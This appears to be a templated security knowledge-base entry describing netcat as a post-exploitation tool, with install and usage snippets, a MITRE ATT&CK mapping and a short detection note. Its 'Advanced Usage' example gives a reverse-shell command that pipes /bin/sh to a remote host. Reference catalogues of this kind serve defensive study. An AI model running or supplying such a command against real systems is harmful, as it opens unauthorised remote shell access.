---
id: fc49e902-1a3e-4c5f-a2ed-451fa6769863
name: nc
type: tool
verified: false
created_at: '2025-12-11T06:10:13.257Z'
updated_at: '2025-12-11T06:10:13.257Z'
platforms:
  - Linux
tags:
  - network
  - shell
url: ''
description: Netcat for establishing reverse shell connections.
validated: true
submitted: true
---

# nc

**Status**: Unverified

## Overview

Netcat is a networking utility for reading/writing across networks, used for reverse shells in exploits.

## Description

Establishes connections to remote hosts for shell access post-exploitation.

## Features

- Feature 1: TCP/UDP connections
- Feature 2: Port scanning
- Feature 3: Shell piping

## Installation

### Requirements

- Linux

### Install Commands

```bash
apt install netcat
```

## Basic Usage

```bash
nc --help
```

### Common Options

| Option | Description |
|--------|-------------|
| -v | Verbose |

## Examples

### Example 1: Basic Usage

```bash
nc host port
```

### Example 2: Advanced Usage

```bash
nc -e /bin/sh host port
```

## MITRE ATT&CK Mapping

This tool is commonly associated with:

### Techniques

- [[Command-Line Interface]]

### Tactics

- [[Execution]]

## Detection

Indicators and methods for detecting this tool's usage:

- Network connections to unusual ports

## Related Procedures

```dataview
TABLE name as "Procedure", verified as "Verified"
FROM "procedures"
WHERE contains(tools, this.file.link)
SORT name ASC
LIMIT 10
```

## Related Tools

- [[tools/git]]

## References

- Official documentation
